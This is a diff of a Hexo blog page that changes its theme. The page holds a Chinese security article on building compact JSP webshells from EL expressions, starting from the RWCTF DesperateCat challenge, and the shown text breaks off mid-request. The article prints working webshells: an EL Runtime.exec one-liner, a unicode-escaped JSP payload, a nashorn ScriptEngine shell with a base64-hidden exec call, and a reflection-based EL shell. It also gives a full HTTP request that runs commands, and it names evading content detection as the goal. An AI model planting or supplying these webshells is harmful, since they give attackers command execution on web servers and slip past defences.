@@ -1,12 +1,22 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="springtime">
+  <meta name="keywords" content="">
   
-  <title>新型EL webshell初探 | spring&#39;s blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="从DesperateCat到EL webshell初探0x00 RWCTF引发的思考前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：   禁止传入圆括号、尖括号、引号等。   如果我们单独处理bypass，那么其实很好解决：    尖括号 &lt;% %&gt;：使用EL表达">
+    <meta name="description" content="从DesperateCat到EL webshell初探0x00 RWCTF引发的思考前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：   禁止传入圆括号、尖括号、引号等。   如果我们单独处理bypass，那么其实很好解决：    尖括号 &lt;% %&gt;：使用EL表达">
 <meta property="og:type" content="article">
 <meta property="og:title" content="新型EL webshell初探">
 <meta property="og:url" content="http://example.com/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/index.html">
@@ -19,87 +29,254 @@
 <meta property="article:published_time" content="2022-09-12T09:58:27.000Z">
 <meta property="article:modified_time" content="2022-09-12T10:16:03.799Z">
 <meta property="article:author" content="springtime">
-<meta name="twitter:card" content="summary">
+<meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140149065.png">
   
-    <link rel="alternate" href="/atom.xml" title="spring's blog" type="application/atom+xml">
   
   
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+  <title>新型EL webshell初探 - spring&#39;s blog</title>
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
 
   
 <meta name="generator" content="Hexo 6.3.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">spring&#39;s blog</a>
-      </h1>
-      
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="新型EL webshell初探"></span>
+          
+        </div>
+
         
-          <a class="main-nav-link" href="/">Home</a>
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-09-12 17:58" pubdate>
+          September 12, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+          8.3k words
         
-      </nav>
-      <nav id="sub-nav">
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+        
+          70 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
       </div>
+
+      
     </div>
   </div>
-</header>
+</div>
 
-      <div class="outer">
-        <section id="main"><article id="post-新型EL-webshell初探" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/" class="article-date">
-  <time class="dt-published" datetime="2022-09-12T09:58:27.000Z" itemprop="datePublished">2022-09-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      新型EL webshell初探
-    </h1>
-  
+</div>
 
-      </header>
+  </header>
+
+  <main>
     
-    <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="从DesperateCat到EL-webshell初探"><a href="#从DesperateCat到EL-webshell初探" class="headerlink" title="从DesperateCat到EL webshell初探"></a>从DesperateCat到EL webshell初探</h1><h2 id="0x00-RWCTF引发的思考"><a href="#0x00-RWCTF引发的思考" class="headerlink" title="0x00 RWCTF引发的思考"></a>0x00 RWCTF引发的思考</h2><pre><code>前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">新型EL webshell初探</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="从DesperateCat到EL-webshell初探"><a href="#从DesperateCat到EL-webshell初探" class="headerlink" title="从DesperateCat到EL webshell初探"></a>从DesperateCat到EL webshell初探</h1><h2 id="0x00-RWCTF引发的思考"><a href="#0x00-RWCTF引发的思考" class="headerlink" title="0x00 RWCTF引发的思考"></a>0x00 RWCTF引发的思考</h2><pre><code class="hljs">前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：
 </code></pre>
 <ul>
 <li><p><strong>禁止传入圆括号、尖括号、引号等</strong>。</p>
@@ -109,75 +286,75 @@
 <ol>
 <li>尖括号 &lt;% %&gt;：使用EL表达式</li>
 </ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&lt;%Runtime.getRuntime.exec(request.getParameter(&quot;cmd&quot;));%&gt;</span></span><br><span class="line"><span class="comment">//替换成为</span></span><br><span class="line">$&#123;Runtime.getRuntime().exec(param.cmd)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//&lt;%Runtime.getRuntime.exec(request.getParameter(&quot;cmd&quot;));%&gt;</span><br><span class="hljs-comment">//替换成为</span><br>$&#123;Runtime.getRuntime().exec(param.cmd)&#125;<br></code></pre></td></tr></table></figure>
 
 <p>这样就避免出现了尖括号。</p>
 <p>2.圆括号 () : java 代码编译解析器会识别 Unicode 形式的编码，所可以直接unicode</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&lt;%Runtime.getRuntime().exec(&quot;calc&quot;);%&gt;</span></span><br><span class="line">&lt;%\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//&lt;%Runtime.getRuntime().exec(&quot;calc&quot;);%&gt;</span><br>&lt;%\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%&gt;<br></code></pre></td></tr></table></figure>
 
 <p>但是要完全bypass，显然两者都是不行的，那么最终的方式是采用EL表达式中的 <strong>‘.’</strong> 与 <strong>‘&#x3D;’</strong>  。</p>
 <ul>
 <li><strong>EL中 . 点号属性取值相当于执行对象的 getter 方法，</strong>&#x3D; <strong>赋值则等同于执行 setter 方法。</strong></li>
 </ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">pageContext.getServletContext().getClassLoader().getResources().getContext().getManager().setPathname(request.getParameter(<span class="string">&quot;a&quot;</span>));</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;<br><span class="hljs-comment">//等同于</span><br>pageContext.getServletContext().getClassLoader().getResources().getContext().getManager().setPathname(request.getParameter(<span class="hljs-string">&quot;a&quot;</span>));<br></code></pre></td></tr></table></figure>
 
 
 
 <p>通过这种方式我们可以获得ClassLoader修改一些tomcat的属性，最终达到利用session写shell的目的，当然到目前这道题目只是完成了一小部分，后面还涉及到如何使Tomcat reload 并实现持久化贮存session的问题等等，各位感兴趣的可以看一下长亭官方的wp。</p>
-<pre><code>**这道题目使用EL表达式进行bypass的方式引起了我的注意，通过精心构造EL表达式我们是否能实现更加精简且具有一定bypass能力的jsp webshell？**
+<pre><code class="hljs">**这道题目使用EL表达式进行bypass的方式引起了我的注意，通过精心构造EL表达式我们是否能实现更加精简且具有一定bypass能力的jsp webshell？**
 </code></pre>
 <h2 id="0x01-简单尝试与回显问题"><a href="#0x01-简单尝试与回显问题" class="headerlink" title="0x01 简单尝试与回显问题"></a>0x01 简单尝试与回显问题</h2><p>我们使用开头提到的EL表达式来试一试：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;Runtime.getRuntime().exec(param.cmd)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140149065.png" alt="image-20220907140149065"></p>
+<p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140149065.png" srcset="/img/loading.gif" lazyload alt="image-20220907140149065"></p>
 <p>执行是没有问题的，但是我们要制作webshell，没有回显是肯定不行的，这里我联想到了前段时间学习webshell免杀的一种构造方式：<strong>调用ScriptEngine来执行js</strong>。</p>
 <blockquote>
 <p>我们使用ScriptEngine构造出的webshell是这样的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;javax.script.ScriptEngineManager&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> String s = &quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=&#x27;&quot;;</span><br><span class="line"> String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> String rt = new String(Base64.getDecoder().decode(&quot;JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs=&quot;));</span><br><span class="line"> Process process = (Process) new ScriptEngineManager().getEngineByName(&quot;nashorn&quot;).eval(s + cmd + rt);</span><br><span class="line"> InputStreamReader reader = new InputStreamReader(process.getInputStream());</span><br><span class="line"> BufferedReader buffer = new BufferedReader(reader);</span><br><span class="line"> s = null;</span><br><span class="line"> while ((s = buffer.readLine()) != null) &#123;</span><br><span class="line">     response.getWriter().println(s);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br> <span class="hljs-type">String</span> s = <span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=&#x27;&quot;</span>;<br> <span class="hljs-type">String</span> cmd = request.<span class="hljs-built_in">getParameter</span>(<span class="hljs-string">&quot;cmd&quot;</span>);<br> <span class="hljs-type">String</span> rt = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(Base64.<span class="hljs-built_in">getDecoder</span>().<span class="hljs-built_in">decode</span>(<span class="hljs-string">&quot;JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs=&quot;</span>));<br> <span class="hljs-built_in">Process</span> process = (<span class="hljs-built_in">Process</span>) <span class="hljs-keyword">new</span> <span class="hljs-built_in">ScriptEngineManager</span>().<span class="hljs-built_in">getEngineByName</span>(<span class="hljs-string">&quot;nashorn&quot;</span>).<span class="hljs-built_in">eval</span>(s + cmd + rt);<br> InputStreamReader reader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">InputStreamReader</span>(process.<span class="hljs-built_in">getInputStream</span>());<br> BufferedReader buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BufferedReader</span>(reader);<br> s = null;<br> <span class="hljs-keyword">while</span> ((s = buffer.<span class="hljs-built_in">readLine</span>()) != null) &#123;<br>     response.<span class="hljs-built_in">getWriter</span>().<span class="hljs-built_in">println</span>(s);<br> &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
 
 <p>很好理解，获取nashorn JavaScript引擎实现命令执行。</p>
 </blockquote>
 <p>想到这种方法是因为我们可以尽可能的减少webshell中的代码量，通过传递指定的js代码来执行脚本，从而更好地绕过文件内容检测。</p>
 <h2 id="0x02-EL-ScriptEngine"><a href="#0x02-EL-ScriptEngine" class="headerlink" title="0x02 EL + ScriptEngine"></a>0x02 EL + ScriptEngine</h2><p>首先我们在webshell中通过反射配合动态传递参数的方式获取Engine并执行eval。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.jsp</span></span><br><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//test.jsp</span><br>$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure>
 
 <p>首先反射获取ScriptEngineManager对象：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.jsp?spr1=javax.script.ScriptEngineManager</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">test.jsp?<span class="hljs-attribute">spr1</span>=javax.script.ScriptEngineManager<br></code></pre></td></tr></table></figure>
 
 <p>然后调用js引擎执行脚本，我们将上方给出的ScriptEngine版本的webshell进行改造，将其改造成js版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">    load(&quot;nashorn:mozilla_compat.js&quot;);</span><br><span class="line">&#125;</span><br><span class="line">catch (e)&#123;</span><br><span class="line">&#125;</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.java.io);</span><br><span class="line">s=[2];</span><br><span class="line">s[0]=&#x27;cmd&#x27;;</span><br><span class="line">s[1]=&#x27;/c whoami /all&#x27;;</span><br><span class="line">a=&quot;&quot;;</span><br><span class="line">b=java.lang.Runtime.getRuntime().exec(s).getInputStream();</span><br><span class="line">output+=new BufferedReader(new+InputStreamReader(b));</span><br><span class="line">while ((line=output.readLine()) != null) </span><br><span class="line">&#123;</span><br><span class="line">    o=o+line+&quot;\n&quot;</span><br><span class="line">&#125;;o</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">try&#123;<br>    load(<span class="hljs-string">&quot;nashorn:mozilla_compat.js&quot;</span>);<br>&#125;<br>catch (e)&#123;<br>&#125;<br>importPackage(Packages.java.util);<br>importPackage(Packages.java.lang);<br>importPackage(Packages.java.io);<br>s=[2];<br>s[0]=<span class="hljs-string">&#x27;cmd&#x27;</span>;<br>s[1]=<span class="hljs-string">&#x27;/c whoami /all&#x27;</span>;<br><span class="hljs-attribute">a</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-attribute">b</span>=java.lang.Runtime.getRuntime().exec(s).getInputStream();<br>output+=new BufferedReader(new+InputStreamReader(b));<br><span class="hljs-keyword">while</span> ((<span class="hljs-attribute">line</span>=output.readLine()) != <span class="hljs-literal">null</span>) <br>&#123;<br>    <span class="hljs-attribute">o</span>=o+line+&quot;\n&quot;<br>&#125;;o<br></code></pre></td></tr></table></figure>
 
 <p>然后我们将其传入执行js，最终的包长这样</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /test.jsp?spr1=javax.script.ScriptEngineManager HTTP/1.1</span><br><span class="line">Host: 172.20.10.2:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=4A34A77B78CD48404804BFD7420A0195</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 414</span><br><span class="line"></span><br><span class="line">spr2=try&#123;load(&quot;nashorn%3amozilla_compat.js&quot;)%3b&#125;catch(e)&#123;&#125;importPackage(Packages.java.util)%3bimportPackage(Packages.java.lang)%3bimportPackage(Packages.java.io)%3bs%3d[2]%3bs[0]%3d&#x27;cmd&#x27;%3bs[1]%3d&#x27;/c+whoami&#x27;%3ba%3d&quot;&quot;%3bb%3djava.lang.Runtime.getRuntime().exec(s).getInputStream()%3boutput+%3d+new+BufferedReader(new+InputStreamReader(b))%3bwhile+((line%3doutput.readLine())+!%3d+null)+&#123;a%3da%2bline%2b&quot;\n&quot;&#125;%3ba</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/test.jsp?spr1=javax.script.ScriptEngineManager</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.20.10.2:8080<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=4A34A77B78CD48404804BFD7420A0195<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>414<br><br><span class="language-xquery">spr2=<span class="hljs-keyword">try</span>&#123;load(<span class="hljs-string">&quot;nashorn%3amozilla_compat.js&quot;</span>)<span class="hljs-meta">%3b</span>&#125;<span 